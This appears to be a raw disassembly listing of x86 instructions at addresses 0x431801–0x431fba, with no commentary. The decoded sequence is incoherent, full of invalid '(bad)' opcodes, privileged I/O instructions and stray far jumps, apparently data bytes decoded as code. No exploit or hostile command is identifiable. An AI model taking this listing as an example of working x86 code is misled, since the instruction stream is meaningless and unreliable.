  431801:	aas    
  431802:	or     eax,DWORD PTR [eax]
  431804:	add    BYTE PTR [eax],al
  431806:	add    BYTE PTR [eax],al
  431808:	and    eax,0x2c59a32a
  43180d:	jmp    0x431806
  43180f:	inc    ecx
  431811:	mov    ah,0x57
  431813:	push   eax
  431814:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431815:	xor    cl,cl
  431817:	pop    es
  431818:	dec    edx
  431819:	dec    esi
  43181a:	and    cl,BYTE PTR ds:0xf77f29b5
  431820:	cmp    cl,ch
  431822:	mov    bh,0x7e
  431824:	ror    BYTE PTR [ebp+0x43],0x7e
  431828:	adc    eax,0x88df3d39
  43182d:	sbb    esi,edx
  43182f:	dec    BYTE PTR [eax+eiz*1+0x2912ffd6]
  431836:	jle    0x431832
  431838:	and    BYTE PTR [ecx],0x71
  43183b:	inc    esp
  43183c:	add    DWORD PTR [edx],eax
  43183e:	xchg   ecx,eax
  43183f:	push   eax
  431840:	(bad)  
  431841:	ss cdq 
  431843:	jg     0x431877
  431845:	scas   al,BYTE PTR es:[edi]
  431846:	(bad)  
  431847:	fldl2e 
  431849:	test   al,0xe8
  43184b:	inc    esp
  43184c:	imul   eax,DWORD PTR [esi],0xbce928b6
  431852:	jl     0x4318af
  431854:	jle    0x43188d
  431856:	jno    0x43189c
  431858:	test   BYTE PTR [ecx-0xc],0xf7
  43185c:	icebp  
  43185d:	mov    esp,0x35ff5b64
  431862:	pop    ecx
  431863:	inc    esp
  431864:	loop   0x431866
  431866:	ds stc 
  431868:	stc    
  431869:	mov    esp,0x5b4c
  43186e:	add    BYTE PTR [eax],al
  431870:	add    bl,dl
  431872:	xor    eax,0x42484441
  431877:	popf   
  431878:	cmp    dl,al
  43187a:	or     ecx,ebp
  43187c:	scas   al,BYTE PTR es:[edi]
  43187d:	repz and eax,0x828a5f65
  431883:	adc    al,0x17
  431885:	cli    
  431886:	mov    ah,0xf4
  431888:	add    eax,edi
  43188a:	scas   al,BYTE PTR es:[edi]
  43188b:	(bad)  
  43188c:	pop    ebx
  43188d:	sahf   
  43188e:	and    ecx,DWORD PTR [edx]
  431890:	inc    esp
  431891:	sahf   
  431892:	(bad)  
  431893:	jbe    0x431868
  431895:	jmp    0xc33edd58
  43189a:	rol    DWORD PTR [eax],1
  43189c:	nop
  43189d:	dec    ecx
  43189e:	ss jmp 0x60f21b22
  4318a4:	xchg   DWORD PTR [ecx+0x698ee90a],edi
  4318aa:	idiv   dl
  4318ac:	ret    
  4318ad:	sub    dh,BYTE PTR [edx+0x357aadd9]
  4318b3:	cmp    ecx,DWORD PTR [eax+ebp*8]
  4318b6:	mov    esi,0x35a51404
  4318bb:	call   FWORD PTR [esi+0x6a0b41f2]
  4318c1:	xor    al,0xa
  4318c3:	add    BYTE PTR ds:0x9e079c66,bl
  4318c9:	sub    al,0xa
  4318cb:	lea    ebp,ds:0x8e500ddd
  4318d1:	aas    
  4318d2:	mov    ah,0xc3
  4318d4:	cmc    
  4318d5:	add    BYTE PTR [eax],al
  4318d7:	add    BYTE PTR [eax],al
  4318d9:	add    bl,dh
  4318db:	mov    dh,0xf
  4318dd:	jmp    0xe1a921ec
  4318e2:	aaa    
  4318e3:	scas   al,BYTE PTR es:[edi]
  4318e4:	subps  xmm5,XMMWORD PTR [ebp+0x37b91fe1]
  4318eb:	push   ebx
  4318ec:	jle    0x431913
  4318ee:	test   DWORD PTR [edi+eax*1-0x72ee13aa],ebx
  4318f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4318f6:	call   0xc3b4:0x3f464fdd
  4318fd:	in     eax,dx
  4318fe:	in     eax,0xc1
  431900:	and    esp,ecx
  431902:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431903:	(bad)  
  431904:	out    0x12,eax
  431906:	xor    al,0x38
  431908:	cli    
  431909:	adc    bl,BYTE PTR [esi+0x39]
  43190c:	je     0x431907
  43190e:	mov    bh,0xae
  431910:	or     edx,DWORD PTR [esi]
  431912:	sub    al,0xfd
  431914:	cli    
  431915:	fidiv  DWORD PTR [edi+0x36d8f00e]
  43191b:	xor    eax,0x427221f1
  431920:	repnz adc DWORD PTR [edi+0x7c],edx
  431924:	in     al,0x8c
  431926:	mov    eax,0xf1510005
  43192b:	xor    al,0xfa
  43192d:	jmp    0xe166cae9
  431932:	mov    bh,0xe
  431934:	xchg   esp,eax
  431935:	sti    
  431936:	ss xor eax,0x2a5800f9
  43193c:	(bad)  
  43193d:	inc    BYTE PTR [eax]
  43193f:	add    BYTE PTR [eax],al
  431941:	add    BYTE PTR [eax],al
  431943:	sub    ecx,edi
  431945:	cmovo  ebx,DWORD PTR [eax+edi*8]
  431949:	rcr    BYTE PTR [ebx],cl
  43194b:	int3   
  43194c:	not    edx
  43194e:	ret    0x108
  431951:	push   ebp
  431952:	mov    eax,DWORD PTR [eax]
  431954:	jl     0x43193c
  431956:	adc    al,0x5f
  431958:	push   edx
  431959:	idiv   bh
  43195b:	lahf   
  43195c:	pop    eax
  43195d:	bound  eax,QWORD PTR [eax+0x6a0000cc]
  431963:	fbld   TBYTE PTR [esi-0x7]
  431966:	fadd   QWORD PTR [bx+si]
  431969:	add    BYTE PTR [eax-0x72fd85ad],al
  43196f:	or     ebp,esi
  431971:	loop   0x431944
  431973:	pop    ss
  431974:	shl    ch,0x84
  431977:	pop    esp
  431978:	ins    DWORD PTR es:[edi],dx
  431979:	pop    edx
  43197a:	(bad)  
  43197b:	fxtract 
  43197d:	dec    edx
  43197e:	(bad)  
  43197f:	f2xm1  
  431981:	loop   0x4319a4
  431983:	push   eax
  431984:	shl    ch,0x84
  431987:	pop    esp
  431988:	ins    DWORD PTR es:[edi],dx
  431989:	dec    edx
  43198a:	xor    esp,DWORD PTR [edi+0x36]
  43198d:	pop    ebx
  43198e:	hlt    
  43198f:	fild   DWORD PTR [ebp-0x7f]
  431992:	jne    0x431920
  431994:	ins    DWORD PTR es:[edi],dx
  431995:	or     eax,DWORD PTR [ecx-0x6000007e]
  43199b:	dec    esp
  43199c:	jns    0x4319d4
  43199e:	cmp    DWORD PTR [ecx],edx
  4319a0:	in     al,dx
  4319a1:	ins    DWORD PTR es:[edi],dx
  4319a2:	add    al,0x37
  4319a4:	in     eax,dx
  4319a5:	jo     0x4319ea
  4319a7:	add    BYTE PTR [eax],al
  4319a9:	add    BYTE PTR [eax],al
  4319ab:	add    dl,ch
  4319ad:	out    0xea,eax
  4319af:	mov    cl,0x51
  4319b1:	ret    0x787
  4319b4:	xchg   edi,eax
  4319b5:	mov    ebp,0x836f276e
  4319ba:	dec    ebx
  4319bb:	or     BYTE PTR [ebp-0x6],dh
  4319be:	aad    0x4f
  4319c0:	and    cl,bh
  4319c2:	aas    
  4319c3:	cli    
  4319c4:	cmp    cl,0xe
  4319c7:	inc    eax
  4319c8:	jne    0x431968
  4319ca:	inc    ebx
  4319cb:	jae    0x431a46
  4319cd:	mov    al,ds:0x5b3e07c2
  4319d2:	mov    dl,0x4
  4319d4:	in     al,dx
  4319d5:	in     al,0x7
  4319d7:	out    0x91,eax
  4319d9:	xchg   esp,eax
  4319da:	clc    
  4319db:	out    0xd6,eax
  4319dd:	fidivr DWORD PTR [edx]
  4319df:	cli    
  4319e0:	lock fidivr WORD PTR [edi]
  4319e3:	out    0x47,eax
  4319e5:	add    BYTE PTR [eax-0x6],0x87
  4319e9:	imul   ebx,ebp,0x767bc56
  4319ef:	add    ah,ch
  4319f1:	inc    esp
  4319f2:	test   DWORD PTR [edx+0x71],ebx
  4319f5:	scas   al,BYTE PTR es:[edi]
  4319f6:	ret    0x9dfb
  4319f9:	push   ss
  4319fa:	cmp    eax,0xfe99aafa
  4319ff:	out    0x8c,al
  431a01:	imul   edx,edi,0xffffff86
  431a04:	pushf  
  431a05:	mov    al,0xb8
  431a07:	outs   dx,DWORD PTR ds:[esi]
  431a08:	mov    edx,0x358aba1c
  431a0d:	sub    DWORD PTR [ecx+0xf1],eax
  431a13:	add    BYTE PTR [eax],al
  431a15:	or     DWORD PTR [esi],ebx
  431a17:	es popa 
  431a19:	in     al,0xdc
  431a1b:	inc    eax
  431a1c:	xchg   BYTE PTR [edx+0x11],ch
  431a1f:	sub    DWORD PTR [edx+0x6a],0x9943360c
  431a26:	push   ebp
  431a27:	std    
  431a28:	jae    0x431a9d
  431a2a:	xchg   esp,eax
  431a2b:	es xchg edi,eax
  431a2d:	add    al,0x36
  431a2f:	aas    
  431a30:	xchg   BYTE PTR [edx],dh
  431a32:	mov    eax,fs
  431a34:	mov    ebp,0x86d12979
  431a39:	dec    ecx
  431a3a:	add    bh,BYTE PTR [eax]
  431a3c:	aad    0xc4
  431a3e:	retf   
  431a3f:	fnstenv [esi+0x40adef8e]
  431a45:	test   eax,0x1f3b5e1a
  431a4a:	lods   eax,DWORD PTR ds:[esi]
  431a4b:	fadd   QWORD PTR [eax-0x77]
  431a4e:	adc    bh,BYTE PTR [edx+0x3b337eb6]
  431a54:	or     al,0xb2
  431a56:	iret   
  431a57:	rcl    BYTE PTR [ecx-0x6],0x32
  431a5b:	call   0x9639fcec
  431a60:	mov    bh,0x6f
  431a62:	pushf  
  431a63:	iret   
  431a64:	loopne 0x4319e8
  431a66:	scas   al,BYTE PTR es:[edi]
  431a67:	fsubr  DWORD PTR [ebp-0x37d57a96]
  431a6d:	inc    ebx
  431a6e:	sar    BYTE PTR [ecx+0x16],cl
  431a71:	xor    eax,0x4204290c
  431a76:	fsubr  QWORD PTR ds:[ebp+0x0]
  431a7d:	add    BYTE PTR [eax+0x348acaca],bh
  431a83:	mov    esi,0xe13779e9
  431a88:	retf   0x2f8c
  431a8b:	loop   0x431a4f
  431a8d:	inc    edx
  431a8e:	xchg   ebp,eax
  431a8f:	or     ebx,ecx
  431a91:	or     al,0xb4
  431a93:	fwait
  431a94:	outs   dx,DWORD PTR ds:[esi]
  431a95:	leave  
  431a96:	xor    al,0x87
  431a98:	test   eax,0xa0bbec1f
  431a9d:	test   eax,0xb7dcd33d
  431aa2:	mov    bl,0x9c
  431aa4:	cld    
  431aa5:	mov    ?,WORD PTR [esi+edx*8+0x185fd3b5]
  431aac:	test   eax,0x6602b519
  431ab1:	inc    edi
  431ab2:	jle    0x431a50
  431ab4:	rcr    ebx,1
  431ab6:	aam    0x7b
  431ab8:	jmp    FWORD PTR [esi-0x594e02d6]
  431abe:	inc    ebx
  431abf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431ac0:	xchg   BYTE PTR [esi],dh
  431ac2:	sub    eax,0x79c8c0a4
  431ac7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431ac8:	push   es
  431ac9:	test   al,0xcf
  431acb:	add    DWORD PTR [edx+0x60],esp
  431ace:	xor    edx,esp
  431ad0:	jle    0x431a80
  431ad2:	sbb    eax,0x221d417f
  431ad7:	ret    0x1788
  431ada:	and    DWORD PTR ds:0xc260ed14,ebp
  431ae0:	jmp    FWORD PTR [ecx+0x0]
  431ae3:	add    BYTE PTR [eax],al
  431ae5:	add    BYTE PTR [eax],al
  431ae7:	cmp    eax,0x253f88fd
  431aec:	int    0x86
  431aee:	scas   eax,DWORD PTR es:[edi]
  431aef:	ret    
  431af0:	fcomp  DWORD PTR [eax+0x2c]
  431af3:	aaa    
  431af4:	sbb    DWORD PTR [eax],eax
  431af6:	sbb    al,0xfe
  431af8:	sbb    eax,0x757a1850
  431afd:	add    BYTE PTR [edx-0x14084fdc],bh
  431b03:	std    
  431b04:	or     DWORD PTR [ecx+0x547a6eb4],ecx
  431b0a:	pop    ebp
  431b0b:	pop    esi
  431b0c:	or     BYTE PTR [edi+0x51],bh
  431b0f:	mov    dh,BYTE PTR [edi+0x39bc6001]
  431b15:	mov    BYTE PTR [edx+edx*2+0x62b4fabf],dh
  431b1c:	sub    eax,0x2ca4d974
  431b21:	je     0x431b00
  431b23:	cmp    esi,DWORD PTR [esi+0x2d2c2607]
  431b29:	cli    
  431b2a:	xchg   esp,eax
  431b2b:	scas   al,BYTE PTR es:[edi]
  431b2c:	sub    DWORD PTR [ebx],eax
  431b2e:	jmp    0x2c0c1da9
  431b33:	add    DWORD PTR [edx],0xf2c70055
  431b39:	jg     0x431b27
  431b3b:	pop    eax
  431b3c:	push   es
  431b3d:	add    BYTE PTR [eax],al
  431b3f:	fild   QWORD PTR [ebx+0x54c055e]
  431b45:	dec    esi
  431b46:	push   edi
  431b47:	push   ebp
  431b48:	and    ebx,DWORD PTR [edx]
  431b4a:	ja     0x431b4c
  431b4c:	add    BYTE PTR [eax],al
  431b4e:	add    BYTE PTR [eax],al
  431b50:	retf   0x6e5c
  431b53:	call   0x3ed206
  431b58:	xchg   edi,eax
  431b59:	cmc    
  431b5a:	sub    edi,edi
  431b5c:	ja     0x431b57
  431b5e:	outs   dx,BYTE PTR ds:[esi]
  431b5f:	sbb    ah,BYTE PTR [esp+eax*2]
  431b62:	push   0xba33cbff
  431b67:	mov    DWORD PTR [edx+0x76],ecx
  431b6a:	mov    ebp,0x3a819806
  431b6f:	add    BYTE PTR [edx+0x7f],dh
  431b72:	inc    eax
  431b73:	inc    esp
  431b74:	jb     0x431bf5
  431b76:	inc    eax
  431b77:	push   esp
  431b78:	push   edi
  431b79:	out    dx,eax
  431b7a:	cmp    edi,0xffffffd0
  431b7d:	push   ebp
  431b7e:	jp     0x431bfd
  431b80:	mov    al,0x4
  431b82:	je     0x431bd8
  431b84:	je     0x431b44
  431b86:	cli    
  431b87:	dec    esp
  431b89:	fsub   QWORD PTR [esi]
  431b8b:	mov    al,0x19
  431b8d:	lock xor eax,0x136ef711
  431b94:	xor    al,0x0
  431b96:	jmp    DWORD PTR [ebx]
  431b99:	xor    al,0xba
  431b9b:	(bad)  
  431b9c:	mov    ds:0x9c407414,al
  431ba1:	xchg   WORD PTR [esi-0x2c],ax
  431ba5:	(bad)  
  431ba7:	xor    al,BYTE PTR [edx+0x7e]
  431baa:	ins    DWORD PTR es:[edi],dx
  431bab:	jo     0x431b8e
  431bad:	cmc    
  431bae:	outs   dx,BYTE PTR ds:[esi]
  431baf:	pop    ss
  431bb0:	out    0xf8,eax
  431bb2:	loop   0x431c14
  431bb4:	add    BYTE PTR [eax],al
  431bb6:	add    BYTE PTR [eax],al
  431bb8:	add    BYTE PTR [ebp-0x79],dh
  431bbb:	cmp    edx,edi
  431bbd:	icebp  
  431bbe:	fnstenv [edx-0x514f01f5]
  431bc4:	out    0xa1,eax
  431bc6:	jg     0x431c01
  431bc8:	cli    
  431bc9:	stc    
  431bca:	fnstenv [edi-0x57d711f0]
  431bd0:	add    dh,bh
  431bd2:	js     0x431c10
  431bd4:	pcmpgtd mm3,QWORD PTR [ecx-0x24]
  431bd8:	pop    ecx
  431bd9:	mov    esi,0x751f3d62
  431bde:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431bdf:	retf   0xcd1f
  431be2:	mov    esi,edi
  431be4:	push   DWORD PTR [ebp+0x4]
  431be7:	dec    esp
  431be8:	jae    0x431c34
  431bea:	xor    al,0x47
  431bec:	jae    0x431c34
  431bee:	into   
  431bef:	mov    es,edi
  431bf1:	jne    0x431c0c
  431bf3:	dec    BYTE PTR [edx]
  431bf5:	and    cl,BYTE PTR [eax+edi*8-0x5bdd9f39]
  431bfc:	ss in  eax,0xc
  431bff:	or     eax,DWORD PTR [edi-0x78f96b45]
  431c05:	mov    bl,0x7
  431c07:	stc    
  431c08:	out    dx,al
  431c09:	inc    edi
  431c0a:	sbb    eax,DWORD PTR [edi+0xc5a8fbe]
  431c10:	mov    dl,0xb5
  431c12:	push   ebx
  431c13:	std    
  431c14:	out    0x18,eax
  431c16:	and    bh,BYTE PTR [ebx]
  431c18:	cli    
  431c19:	out    dx,al
  431c1a:	data16 fiadd WORD PTR [edi+0x0]
  431c21:	add    BYTE PTR [eax],dh
  431c23:	add    eax,0x5ebb0329
  431c28:	loop   0x431c29
  431c2a:	jnp    0x431be3
  431c2c:	ret    0x1b23
  431c2f:	sbb    al,0x3d
  431c31:	popa   
  431c32:	neg    cl
  431c34:	out    dx,eax
  431c35:	popa   
  431c36:	cld    
  431c37:	add    DWORD PTR [edx+0x28777e17],ebp
  431c3d:	aam    0x5a
  431c3f:	add    DWORD PTR [ecx+0x3f],0x5f
  431c43:	jns    0x431be6
  431c45:	adc    edi,eax
  431c47:	inc    ecx
  431c48:	jl     0x431bd4
  431c4a:	retf   
  431c4b:	lods   eax,DWORD PTR ds:[esi]
  431c4c:	lock add edi,edx
  431c4f:	or     al,0xb5
  431c51:	adc    eax,0xd7502b5
  431c56:	fwait
  431c57:	adc    ah,dl
  431c59:	mov    dh,0x72
  431c5b:	jge    0x431c7e
  431c5d:	enter  0x2fb2,0xb5
  431c61:	xor    BYTE PTR [esi],0xfe
  431c64:	gs mov esi,0xe3d027e
  431c6a:	xchg   ebx,eax
  431c6b:	push   cs
  431c6c:	mov    edx,0x297d6eb6
  431c71:	fsubr  DWORD PTR [edx-0x497f6ad1]
  431c77:	std    
  431c78:	mov    eax,ds:0x237c86b6
  431c7d:	adc    al,0xde
  431c7f:	mov    ah,0xf8
  431c81:	out    dx,eax
  431c82:	mov    BYTE PTR [edi],ch
  431c84:	adc    ebp,eax
  431c86:	add    BYTE PTR [eax],al
  431c88:	add    BYTE PTR [eax],al
  431c8a:	add    BYTE PTR [ecx],al
  431c8c:	(bad)  
  431c8d:	fidiv  DWORD PTR [esi-0x51f5e59e]
  431c93:	mov    edi,0x62be682e
  431c98:	push   es
  431c99:	repz pop es
  431c9b:	bound  eax,QWORD PTR [edx+0x4d]
  431c9e:	pop    es
  431c9f:	jle    0x431d19
  431ca1:	mov    ds:0xf9c6ed1b,eax
  431ca6:	sub    BYTE PTR [ecx+0x1a],dh
  431ca9:	mov    dl,0xad
  431cab:	(bad)  
  431cac:	cs ins DWORD PTR es:[edi],dx
  431cae:	mov    ah,0x7a
  431cb0:	pushf  
  431cb1:	or     al,0x8f
  431cb3:	aaa    
  431cb4:	sbb    BYTE PTR [eax],al
  431cb6:	cdq    
  431cb7:	mov    al,ds:0x2b2ece2b
  431cbc:	push   cs
  431cbd:	jg     0x431cee
  431cbf:	pop    edx
  431cc0:	sub    DWORD PTR [ebp+edi*8+0x48],esi
  431cc4:	sub    esi,ecx
  431cc6:	out    0xe0,al
  431cc8:	(bad)  
  431cc9:	and    ebp,edx
  431ccb:	or     ecx,DWORD PTR [esi]
  431ccd:	jg     0x431cfc
  431ccf:	outs   dx,BYTE PTR ds:[esi]
  431cd0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431cd1:	add    BYTE PTR [ecx+0x71df2628],bl
  431cd7:	jns    0x431d01
  431cd9:	or     dh,BYTE PTR [esi]
  431cdb:	dec    ecx
  431cdc:	adc    al,bl
  431cde:	ins    BYTE PTR es:[edi],dx
  431cdf:	imul   ebp,DWORD PTR [ebx],0x275defa
  431ce5:	add    cl,ch
  431ce7:	cmc    
  431ce8:	aas    
  431ce9:	jae    0x431cca
  431ceb:	add    esi,DWORD PTR [ecx+0x740f]
  431cf1:	add    BYTE PTR [eax],al
  431cf3:	add    ah,dh
  431cf5:	xor    eax,0x253ebef9
  431cfa:	pop    eax
  431cfb:	push   ebp
  431cfc:	sub    BYTE PTR ds:[esi-0x6b35f5a],al
  431d03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431d04:	scas   al,BYTE PTR es:[edi]
  431d05:	(bad)  
  431d06:	xchg   BYTE PTR [ebp+0x632f19fa],cl
  431d0c:	imul   eax,DWORD PTR [edx-0x41012640],0x2fb973ef
  431d16:	or     DWORD PTR [esi],esi
  431d18:	mov    ecx,0xb505303
  431d1d:	add    DWORD PTR [eax-0xd3597e4],ecx
  431d23:	pusha  
  431d24:	sti    
  431d25:	cmp    ah,BYTE PTR [ebp-0x1a]
  431d28:	in     eax,dx
  431d29:	scas   al,BYTE PTR es:[edi]
  431d2a:	iret   
  431d2b:	pop    edi
  431d2c:	dec    eax
  431d2d:	test   DWORD PTR [ebx+ebx*2+0x2],eax
  431d31:	mov    DWORD PTR [edi],0xe9430500
  431d37:	(bad)  
  431d38:	fyl2x  
  431d3a:	dec    edx
  431d3b:	xor    ecx,DWORD PTR [esi+ebx*8+0x44]
  431d3f:	mov    esp,0xc07ee9a3
  431d44:	arpl   WORD PTR [ebp+0x14c00dd],bp
  431d4a:	lea    eax,[ebp-0x64]
  431d4d:	push   ebp
  431d4e:	sub    al,0xdb
  431d50:	aad    0x43
  431d52:	repnz (bad) 
  431d54:	sbb    ecx,esi
  431d56:	or     al,BYTE PTR [eax]
  431d58:	add    BYTE PTR [eax],al
  431d5a:	add    BYTE PTR [eax],al
  431d5c:	add    BYTE PTR [ecx+eax*1-0x7d],cl
  431d60:	inc    ebp
  431d61:	inc    esp
  431d62:	jg     0x431d5e
  431d64:	mov    DWORD PTR [esi+eax*8-0x1e],edx
  431d68:	add    al,0x18
  431d6a:	jbe    0x431de6
  431d6c:	loope  0x431d81
  431d6e:	jns    0x431db3
  431d70:	dec    DWORD PTR [esi+eax*8-0x7f23cda1]
  431d77:	jnp    0x431d78
  431d79:	mov    dh,0x70
  431d7b:	or     al,BYTE PTR [eax+0xfb0e959]
  431d81:	jp     0x431d49
  431d83:	xchg   edi,eax
  431d84:	push   0xffffffd6
  431d86:	inc    edi
  431d87:	in     eax,dx
  431d88:	jmp    DWORD PTR [ecx+0x47]
  431d8b:	sub    cl,BYTE PTR [edi]
  431d8d:	dec    edx
  431d8e:	aam    0xf8
  431d90:	ret    
  431d91:	push   esp
  431d92:	add    eax,0xe9898a2a
  431d97:	add    eax,0xb9eb07b6
  431d9c:	mov    BYTE PTR [eax-0x473f81cb],ch
  431da2:	clc    
  431da3:	push   es
  431da4:	mov    dh,0xd7
  431da6:	js     0x431da6
  431da8:	xor    BYTE PTR [edx],dl
  431daa:	(bad)  
  431dab:	cmc    
  431dac:	inc    ebp
  431dad:	adc    al,0xe8
  431daf:	dec    ebx
  431db0:	lock jne 0x431e01
  431db3:	bound  ecx,QWORD PTR [edx]
  431db5:	retf   
  431db6:	xlat   BYTE PTR ds:[ebx]
  431db7:	inc    eax
  431db8:	add    eax,DWORD PTR [ebp+0x15]
  431dbb:	mov    eax,DWORD PTR [ebp+ebp*2+0x51]
  431dbf:	add    BYTE PTR [edi],ch
  431dc1:	add    BYTE PTR [eax],al
  431dc3:	add    BYTE PTR [eax],al
  431dc5:	add    BYTE PTR [edi+0x73f22d93],ah
  431dcb:	fld    DWORD PTR ds:0x48193eb2
  431dd1:	test   BYTE PTR [edi-0x69],al
  431dd4:	or     ebx,eax
  431dd6:	je     0x431d5f
  431dd8:	scas   eax,DWORD PTR es:[edi]
  431dd9:	call   DWORD PTR [edx-0x66]
  431ddc:	inc    ecx
  431ddd:	std    
  431dde:	pop    edi
  431ddf:	mov    BYTE PTR [ecx-0x7092bc],cl
  431de5:	cs daa 
  431de7:	xchg   ebp,eax
  431de8:	sub    eax,0xb007f8f2
  431ded:	pop    es
  431dee:	xor    bl,BYTE PTR [ebx]
  431df0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431df1:	push   0x382b199f
  431df6:	out    dx,al
  431df7:	fimul  WORD PTR [ebx]
  431df9:	test   al,0x76
  431dfb:	(bad)  
  431dfc:	or     al,0xc3
  431dfe:	je     0x431dd2
  431e00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431e01:	popa   
  431e02:	xchg   edx,eax
  431e03:	cdq    
  431e04:	inc    esp
  431e05:	add    ecx,DWORD PTR [esi]
  431e07:	add    BYTE PTR [edx-0x27785802],ch
  431e0d:	repnz loop 0x431dae
  431e10:	push   ecx
  431e11:	je     0x431e80
  431e13:	fs (bad) 
  431e15:	push   0x67
  431e17:	cld    
  431e18:	add    esp,edi
  431e1a:	imul   edx,DWORD PTR [ebx+0x2e7407ba],0xfb74c306
  431e24:	call   0xc2:0xfd807573
  431e2b:	add    BYTE PTR [eax],al
  431e2d:	add    BYTE PTR [eax],al
  431e2f:	je     0x431e29
  431e31:	test   al,0x6c
  431e33:	jne    0x431e37
  431e35:	imul   eax,DWORD PTR [ebp-0x5d],0xb44592fc
  431e3c:	push   es
  431e3d:	sbb    DWORD PTR [ebx+edi*8],eax
  431e40:	aas    
  431e41:	lods   eax,DWORD PTR ds:[esi]
  431e42:	fdivr  DWORD PTR [ebp+0x2803ec40]
  431e48:	ja     0x431e96
  431e4a:	test   DWORD PTR [esi+0x1d09ad2],ecx
  431e50:	lds    eax,FWORD PTR [eax-0x2c]
  431e53:	push   edx
  431e54:	mov    BYTE PTR gs:[ecx],bh
  431e57:	pop    edi
  431e58:	xchg   BYTE PTR [eax],ch
  431e5a:	mov    al,0x73
  431e5c:	push   0x2d
  431e5e:	add    DWORD PTR [ebp+0x2],esi
  431e61:	cmp    edx,0xffffffb1
  431e64:	sbb    dh,BYTE PTR [ebp+0xd]
  431e67:	lock les edx,FWORD PTR [eax]
  431e6a:	aam    0x3f
  431e6c:	adc    eax,0x2b51341
  431e71:	add    DWORD PTR [edi-0x5c],ecx
  431e74:	sub    esp,ecx
  431e76:	test   BYTE PTR [ecx-0x4e7517d6],bl
  431e7c:	cs xchg ecx,eax
  431e7e:	push   edi
  431e7f:	jns    0x431e83
  431e81:	jmp    0xe93da80a
  431e86:	ror    BYTE PTR [ecx+0x150eb9fa],1
  431e8c:	adc    BYTE PTR [ecx],ch
  431e8e:	add    al,0xda
  431e90:	adc    DWORD PTR [edx+0xae],ebp
  431e96:	add    BYTE PTR [eax],al
  431e98:	jb     0x431ec5
  431e9a:	sti    
  431e9b:	jecxz  0x431f10
  431e9d:	ret    0xf6e8
  431ea0:	fadd   DWORD PTR [ecx]
  431ea2:	jmp    0x5e2f66aa
  431ea7:	mov    esi,0x7a96eece
  431eac:	(bad)  
  431eae:	call   0xff73e4b6
  431eb3:	arpl   bx,si
  431eb5:	and    cl,BYTE PTR [esp+esi*8-0x381842da]
  431ebc:	pop    esp
  431ebd:	sub    dl,bh
  431ebf:	pop    esi
  431ec0:	(bad)  [esi]
  431ec2:	sub    DWORD PTR [ecx],0xffffffe2
  431ec5:	pop    es
  431ec6:	xchg   DWORD PTR [edx+esi*2+0x2d51c983],esi
  431ecd:	cmp    dl,0x3e
  431ed0:	icebp  
  431ed1:	and    bh,bh
  431ed3:	mov    esp,0xb547ba8e
  431ed8:	jb     0x431f07
  431eda:	inc    esp
  431edb:	and    edi,esi
  431edd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431ede:	not    DWORD PTR [ecx]
  431ee0:	jno    0x431ee4
  431ee2:	add    BYTE PTR [ebx-0x51402827],bl
  431ee8:	sub    al,0x3b
  431eea:	mov    ebp,0x7276f1
  431eef:	adc    al,BYTE PTR [esi+ecx*8-0x40fefa7a]
  431ef6:	pop    es
  431ef7:	push   0x52
  431ef9:	std    
  431efa:	dec    esi
  431efb:	aas    
  431efc:	add    BYTE PTR [eax],al
  431efe:	add    BYTE PTR [eax],al
  431f00:	add    BYTE PTR [edx],dh
  431f02:	mov    al,ds:0x2de46c07
  431f07:	push   esi
  431f08:	ror    DWORD PTR [ecx+0x6cefa74],0x2d
  431f0f:	ss scas al,BYTE PTR es:[edi]
  431f11:	(bad)  
  431f12:	enter  0x3c38,0x3d
  431f16:	stos   DWORD PTR es:[edi],eax
  431f17:	push   esi
  431f18:	bound  esi,QWORD PTR [ecx+eax*1-0x5102199a]
  431f1f:	test   DWORD PTR [edx-0x6f],0xa29eb294
  431f26:	lock ret 0xbd1c
  431f2a:	add    BYTE PTR [ecx+eiz*8+0x1c],0xfb
  431f2f:	mov    WORD PTR [eax],es
  431f31:	sar    ebp,0x52
  431f34:	call   0x38b88a
  431f39:	out    0xe8,eax
  431f3b:	jae    0x431f77
  431f3d:	pop    ss
  431f3e:	inc    ebx
  431f3f:	test   BYTE PTR [ebx],0x53
  431f42:	xchg   DWORD PTR [ecx],esp
  431f44:	ret    0xc627
  431f47:	iret   
  431f48:	sti    
  431f49:	pop    ss
  431f4a:	cmc    
  431f4b:	add    eax,0xf9eda1af
  431f50:	je     0x431ed6
  431f52:	jp     0x431f94
  431f54:	add    bl,ah
  431f56:	lock jae 0x431f65
  431f59:	stos   DWORD PTR es:[edi],eax
  431f5a:	adc    esp,DWORD PTR [eax+0x16]
  431f5d:	sbb    al,0x5
  431f5f:	pop    ecx
  431f60:	pop    ecx
  431f61:	sar    DWORD PTR [esi+0x196e],1
  431f67:	add    BYTE PTR [eax],al
  431f69:	add    dl,bh
  431f6b:	add    DWORD PTR [ebp-0x623a285],ecx
  431f71:	mov    BYTE PTR [ecx],bl
  431f73:	icebp  
  431f74:	aaa    
  431f75:	jge    0x431fef
  431f77:	jno    0x431f40
  431f79:	push   0x75
  431f7b:	inc    esi
  431f7c:	push   ebp
  431f7d:	pop    esi
  431f7e:	pop    es
  431f7f:	mov    dh,0xbc
  431f81:	or     BYTE PTR [eax+eax*1],bl
  431f84:	scas   al,BYTE PTR es:[edi]
  431f85:	push   es
  431f86:	sub    edx,DWORD PTR [edi-0x1b32feb8]
  431f8c:	add    al,BYTE PTR [ebx]
  431f8e:	fstp   st(3)
  431f90:	loope  0x431f1d
  431f92:	fnstsw WORD PTR [ebx-0x31]
  431f95:	shl    DWORD PTR [esi],0x15
  431f98:	and    eax,0xfaf00c00
  431f9d:	or     bl,BYTE PTR [esi]
  431f9f:	jl     0x431f70
  431fa1:	cmp    DWORD PTR [esi-0x33ff08fc],0xe710dfbd
  431fab:	int    0xbf
  431fad:	call   0xdd864327
  431fb2:	jge    0x431fd8
  431fb4:	inc    eax
  431fb5:	mov    esi,0x4e22b428
  431fba:	out    dx,al
